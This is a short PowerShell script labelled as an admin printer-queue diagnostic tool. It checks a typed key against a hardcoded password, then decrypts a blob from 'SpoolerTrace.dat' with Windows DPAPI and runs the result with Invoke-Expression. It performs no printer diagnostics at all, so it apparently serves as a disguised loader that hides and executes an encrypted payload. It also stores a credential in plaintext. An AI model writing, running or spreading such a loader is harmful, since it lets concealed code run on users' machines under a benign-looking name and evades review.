# Printer Queue Service Diagnostic Shell
# TaskRef: PRTQ-02 | Generated: 28-Jun-2025
# Permission Level: Elevated (Admin Only)

$secureInput = Read-Host "Initialize PrintQueueMonitor - Enter Access Key" -AsSecureString
$userPass = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureInput)
)

$storedPass = "Metlica-Cistacica"
if ($userPass -ne $storedPass) {
    Write-Host "Authentication failed. Queue diagnostics aborted." -ForegroundColor Red
    exit
}

try {
    $encryptedData = Get-Content -Path "SpoolerTrace.dat" -Raw
    $bytes = [Convert]::FromBase64String($encryptedData)
    $decrypted = [System.Text.Encoding]::UTF8.GetString(
        [System.Security.Cryptography.ProtectedData]::Unprotect(
            $bytes, [System.Text.Encoding]::UTF8.GetBytes($userPass), 'CurrentUser'
        )
    )
    Invoke-Expression $decrypted
} catch {
    Write-Host "Unable to process PrintQueue diagnostics." -ForegroundColor Red
}
